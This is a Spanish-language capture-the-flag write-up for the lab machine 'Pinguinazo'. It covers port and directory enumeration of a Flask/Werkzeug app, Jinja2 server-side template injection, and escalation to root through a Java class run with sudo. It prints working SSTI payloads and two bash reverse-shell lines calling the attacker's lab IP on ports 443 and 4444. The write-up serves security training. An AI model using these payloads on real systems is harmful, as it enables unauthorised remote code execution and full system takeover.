---
description: >-
  ✍️ Autor: El Pingüino de Mario🔍 Dificultad: Fácil  📅 Fecha de creación:
  24/06/2024
---

# Pinguinazo

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo, se identificó que el puerto 5000/tcp está abierto y asociado al servicio `upnp`. El estado del puerto es `open` y la razón es `syn-ack`.

### 🔎 **EXPLORACIÓN**

Para saber más información sobre el puerto abierto, se realiza el siguiente comando:

```bash
nmap -sCV -p5000 172.17.0.2 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

Parece que estamos tratando con un servidor que utiliza **Werkzeug** con **Flask**. Vamos a realizar una inspección manual de este sitio web.

<figure><img src="../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2:5000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado un directorio llamado `console`, que en este tipo de servidores podría permitir la ejecución remota de código (RCE). Sin embargo, está protegido por un PIN, así que continuaremos con la enumeración.

Parece que el fuzzeo hasta ahora no ha proporcionado más resultados. Vamos a experimentar con el formulario que encontramos al principio. Observamos que hay una reflexión en el campo del nombre, por lo que probaremos si interpreta el código HTML.&#x20;

<figure><img src="../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

Hemos confirmado que el formulario interpreta etiquetas HTML. Ahora, vamos a probar si es vulnerable a un ataque de SSTI (Server-Side Template Injection) utilizando el payload `{{7+7}}`. Si la operación se ejecuta correctamente, esto indicará que es posible inyectar y ejecutar comandos a través de estas plantillas.

<figure><img src="../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

Como se ha realizado correctamente inyectaremos una reverse shell y así poder obtener el acceso al sistema.

Después de investigar varios payloads para **Jinja2**, encontramos uno que permite ejecutar un comando para enviar una shell a nuestra máquina atacante. Utilizamos **HackTricks** y el repositorio de **PayloadAllTheThings** para esta investigación. Enviaremos un **payload** para ver el ID de usuario.

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

<figure><img src="../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

Con esta información, intentaremos establecer una **shell** utilizando este método. Ejecutaremos el siguiente comando, que hemos adaptado para incluir nuestra propia shell, tal como se detalla en la página mencionada.

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}
```

<figure><img src="../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>

En **GTFOBins** no encontramos información relevante para nuestro caso, pero hemos encontrado información útil en la siguiente página:

[RevShells](https://www.revshells.com/)

Esta página proporciona una variedad de técnicas y ejemplos para obtener shells reversas en diferentes entornos, lo cual puede ser crucial para nuestra investigación y para implementar un método adecuado para el objetivo.

```bash
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/4444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

Nos ponemos en escucha con **netcat**, esta vez por el puerto **4444** y ejecutamos como sudo el fichero java que hemos creado.

```bash
nc -lvnp 4444
```

Conseguimos ser **root**.
